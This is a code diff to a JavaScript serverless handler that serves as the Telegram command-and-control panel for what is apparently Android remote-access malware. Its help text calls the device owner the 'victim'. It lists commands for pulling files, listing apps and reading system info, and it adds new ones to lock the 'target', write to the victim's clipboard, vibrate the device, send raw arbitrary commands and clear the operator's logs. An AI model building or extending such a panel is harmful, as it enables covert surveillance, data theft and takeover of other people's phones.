@@ -165,9 +165,15 @@ export default async function handler(req, res) {
             `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n` +
             `/getfile <filename> - سحب ملف من Download\n` +
             `/ai <prompt> - التحدث مع الذكاء الاصطناعي\n\n` +
+            `🎛️ *التحكم فـ الجهاز:*\n` +
+            `/color <#hex> - تبديل لون شاشة القفل\n` +
+            `/clip <text> - نسخ نص لـ clipboard ديال الضحية\n` +
+            `/vibrate - تهزيز الجهاز\n` +
+            `/raw <payload> - صيفط أمر خام مباشرة (مثال: /raw sysinfo:1)\n\n` +
             `⏱️ *التحكم بالوقت:*\n` +
             `/gentime <minutes> /settime <minutes>\n\n` +
-            `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist`); 
+            `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist\n\n` +
+            `🧹 *أخرى:*\n/stats /logs /clear /ping`); 
           break;
         
         case '/ai':
@@ -182,7 +188,7 @@ export default async function handler(req, res) {
                   "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
-                  model: "llama-3.1-8b-instant",
+                  model: "llama3-8b-8192",
                   messages: [
                     { role: "system", content: "أنت مساعد ذكي، تجاوب بشكل واضح ومفيد. تجاوب بالعربية أو الدارجة إلا كان السؤال بالدارجة." },
                     { role: "user", content: prompt }
@@ -191,12 +197,6 @@ export default async function handler(req, res) {
                 })
               });
               const data = await groqRes.json();
-              
-              if (!groqRes.ok) {
-                await sendToTelegram(`❌ *Groq Error (${groqRes.status}):*\n\`${data?.error?.message || JSON.stringify(data)}\``);
-                return res.status(200).end();
-              }
-              
               const aiText = data?.choices?.[0]?.message?.content || "ماقدرتش نجاوب دابا.";
               await sendToTelegram(`🤖 *الذكاء الاصطناعي:*\n\n${aiText}`);
             } catch (e) {
@@ -248,6 +248,36 @@ export default async function handler(req, res) {
         case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
         case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
         
+        // ===== أوامر جديدة كيدعمها الـ Smali =====
+        case '/color':
+          if(args[1]) {
+            remoteCommand = `color:${args[1]}`;
+            await sendToTelegram(`🎨 \`[UI]\` *Lock screen color changed to:* \`${args[1]}\``);
+          } else await sendToTelegram("⚠️ استعمل: `/color #FF0000`");
+          break;
+
+        case '/clip':
+          if(args[1]) {
+            const clipText = args.slice(1).join(' ');
+            remoteCommand = `clipboard:${clipText}`;
+            await sendToTelegram("📋 `[CLIP]` *Text copied to target's clipboard.*");
+          } else await sendToTelegram("⚠️ استعمل: `/clip <text>`");
+          break;
+
+        case '/vibrate':
+          remoteCommand = "vibrate:1";
+          await sendToTelegram("📳 `[SYS]` *Vibrating target device...*");
+          break;
+
+        case '/raw':
+          if(args[1]) {
+            const rawCmd = args.slice(1).join(' ');
+            remoteCommand = rawCmd;
+            await sendToTelegram(`📡 \`[RAW]\` *Payload sent:*\n\`${rawCmd}\``);
+          } else await sendToTelegram("⚠️ استعمل: `/raw sysinfo:1` أو `/raw url:https://google.com`");
+          break;
+        // ========================================
+
         case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
         case '/unlock': await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
         case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``); } break;
@@ -267,6 +297,13 @@ export default async function handler(req, res) {
         
         case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``); break;
         case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
+        
+        // أمر جديد باش تمسح اللوغات
+        case '/clear':
+          recentLogs = [];
+          await sendToTelegram("🗑️ `[SYS]` *Logs cleared.*");
+          break;
+          
         case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
         
         default:
